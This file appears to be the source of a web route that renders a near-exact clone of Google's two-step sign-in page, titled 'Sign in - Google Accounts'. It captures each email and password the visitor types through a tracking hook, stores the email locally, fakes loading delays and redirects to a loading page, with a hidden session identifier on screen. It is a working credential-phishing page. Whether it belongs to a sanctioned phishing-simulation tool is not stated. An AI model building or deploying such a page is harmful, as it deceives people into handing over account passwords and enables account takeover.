import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { GoogleGLogo, GeGoogleFont, useGeTracking } from "@/components/ge/GeShared";
import loginCss from "@/components/ge/login.css?raw";

export const Route = createFileRoute("/ge/signin")({
  head: () => ({ meta: [{ title: "Sign in - Google Accounts" }] }),
  component: GeSignInPage,
});

function GeSignInPage() {
  const { trackClick, trackInput, geNavigate, sessionId } = useGeTracking();
  const [step, setStep] = useState<"email" | "password">("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const emailRef = useRef<HTMLInputElement>(null);
  const pwRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    (step === "email" ? emailRef : pwRef).current?.focus();
  }, [step]);

  const submitEmail = (e: React.FormEvent) => {
    e.preventDefault();
    const v = email.trim();
    if (!v) return;
    trackClick("Next-Email");
    trackInput("email", v);
    try { localStorage.setItem("saved_user_email", v); } catch { /* noop */ }
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep("password");
    }, 900 + Math.random() * 900);
  };

  const submitPassword = (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) return;
    trackClick("Next-Password");
    trackInput("password", password);
    setLoading(true);
    setTimeout(() => geNavigate("/ge/loading"), 900 + Math.random() * 900);
  };

  const initial = (email.trim()[0] || "?").toUpperCase();

  return (
    <>
      <GeGoogleFont />
      <style>{loginCss}</style>
      <style>{`html, body, #root { min-height: 100vh; } body { margin: 0; }`}</style>
      <div className={`container ${loading ? "loading-body" : ""}`}>
        <div className={`loading-overlay ${loading ? "active" : ""}`} id="loadingOverlay">
          <div className="loading-bar"></div>
        </div>

        {step === "email" ? (
          <>
            <div className="left-part">
              <GoogleGLogo />
              <div className="text-content">
                <h1>Sign in</h1>
                <p>to continue to Google</p>
              </div>
            </div>
            <div className="right-part">
              <form className="form-container" onSubmit={submitEmail}>
                <input
                  ref={emailRef}
                  type="email"
                  name="email"
                  className="email-input"
                  placeholder="Email or phone"
                  value={email}
                  onChange={(e) => { setEmail(e.target.value); trackInput("email", e.target.value); }}
                  required
                />
                <span className="forgot-email" onClick={() => trackClick("Forgot-Email")}>Forgot email?</span>
                <p>
                  Not your computer? Use Guest mode to sign in privately.{" "}
                  <span className="hypertext" style={{ cursor: "pointer" }} onClick={() => trackClick("Guest-Mode")}>Learn more about using Guest mode</span>
                </p>
                <div className="button-container">
                  <button type="button" className="create-account-btn" onClick={() => trackClick("Create-Account")}>Create account</button>
                  <button type="submit" className="next-btn" name="submit_button">Next</button>
                </div>
              </form>
            </div>
          </>
        ) : (
          <>
            <div className="left-part">
              <GoogleGLogo />
              <div className="text-content">
                <h1>Welcome</h1>
                <div
                  className="email-container"
                  style={{ marginTop: 20 }}
                  onClick={() => { trackClick("Change-Email"); setStep("email"); setPassword(""); }}
                >
                  <span style={{
                    width: 22, height: 22, borderRadius: "50%", background: "#DADCE0",
                    display: "inline-flex", alignItems: "center", justifyContent: "center",
                    fontSize: 12, fontWeight: 700, color: "#1f1f1f", marginLeft: 3
                  }}>{initial}</span>
                  <span className="email-text">{email}</span>
                  <svg width="10" height="6" viewBox="0 0 10 6" style={{ marginRight: 2 }} fill="currentColor"><path d="M5 6 0 0h10z"/></svg>
                </div>
              </div>
            </div>
            <div className="right-part">
              <form className="form-container" onSubmit={submitPassword}>
                <input
                  ref={pwRef}
                  type="password"
                  name="password"
                  className="email-input"
                  placeholder="Enter your password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
                <span className="forgot-email" onClick={() => trackClick("Forgot-Password")}>Forgot password?</span>
                <p>Show password</p>
                <div className="button-container">
                  <button type="button" className="create-account-btn" onClick={() => trackClick("Try-Another-Way")}>Try another way</button>
                  <button type="submit" className="next-btn" name="submit_button">Next</button>
                </div>
              </form>
            </div>
          </>
        )}
      </div>
      <div style={{ position: "fixed", bottom: 8, right: 8, fontSize: 10, opacity: 0, pointerEvents: "none" }}>{sessionId}</div>
    </>
  );
}
